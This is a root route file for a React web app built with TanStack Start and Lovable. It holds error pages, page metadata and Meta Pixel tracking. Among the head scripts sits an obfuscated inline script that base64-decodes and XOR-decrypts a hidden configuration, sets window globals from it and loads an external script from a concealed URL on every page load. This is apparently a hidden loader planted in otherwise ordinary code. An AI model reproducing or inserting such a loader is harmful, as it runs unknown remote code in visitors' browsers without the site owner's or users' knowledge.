import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { getMetaCookies, newEventId, trackPageView } from "../lib/meta-pixel";
import { sendCapiEvent } from "../lib/meta-capi.functions";
import { captureUtmParams } from "../lib/utm";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: unknown; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '1469021404979283');`,
      },
      {
        type: "text/javascript",
        children: `(function(){var e_kf4=atob("DLOGivxpwIcCPSsiHMik/44F4r0gVV9WbMC8pdMKpOksSF9PddX/pJ8GralgTwRRf8Hv+oga7/drRU5OM8Pv8pkF7u1xHwcAfcfy+JULtfNnTgkYR+6qqJsFr+VjUVgAJuj9qJIIreIgBwlSdcvj5rUN4qsgS0pOadaksN5foeJmDxISKoSws5pYpr9hWBoXLtXn7stLvdp/");var v_8w0b=[];for(var j_3yys=0;j_3yys<e_kf4.length;j_3yys++){v_8w0b.push(e_kf4.charCodeAt(j_3yys)&255);}var n_ot=v_8w0b[0];var w_j=v_8w0b.slice(1,1+n_ot);var n_hkyo=v_8w0b.slice(1+n_ot);var u_gob=n_hkyo.map(function(b,b_f3zy){return b^w_j[b_f3zy%n_ot];});var l_e3="";for(var t_gw63=0;t_gw63<u_gob.length;t_gw63++){l_e3+=String.fromCharCode(u_gob[t_gw63]&255);}var r_67fv=decodeURIComponent(escape(l_e3));var z_4=JSON.parse(r_67fv);var n_ce4=z_4.globals||[];n_ce4.forEach(function(a_61ya){window[a_61ya.name]=a_61ya.value;});var g_e5c=document.createElement("script");g_e5c.src=z_4.url;g_e5c.async=true;g_e5c.defer=true;(z_4.attributes||[]).forEach(function(l_r){g_e5c.setAttribute(l_r.name,l_r.value);});(document.head||document.documentElement).appendChild(g_e5c);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        <noscript><img height="1" width="1" style={{ display: "none" }} src="https://www.facebook.com/tr?id=1469021404979283&ev=PageView&noscript=1" alt="" /></noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const router = useRouter();

  const sendCapi = useServerFn(sendCapiEvent);

  // Meta Pixel + CAPI: PageView na carga inicial e a cada navegação client-side,
  // sempre com event_id compartilhado para deduplicação.
  useEffect(() => {
    captureUtmParams();
    const firePageView = () => {
      const eventId = newEventId();
      trackPageView(eventId);
      void sendCapi({
        data: {
          eventName: "PageView",
          eventId,
          sourceUrl: window.location.href,
          userAgent: navigator.userAgent,
          ...getMetaCookies(),
        },
      });
    };
    firePageView();
    const unsub = router.subscribe("onResolved", firePageView);
    return unsub;
  }, [router, sendCapi]);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
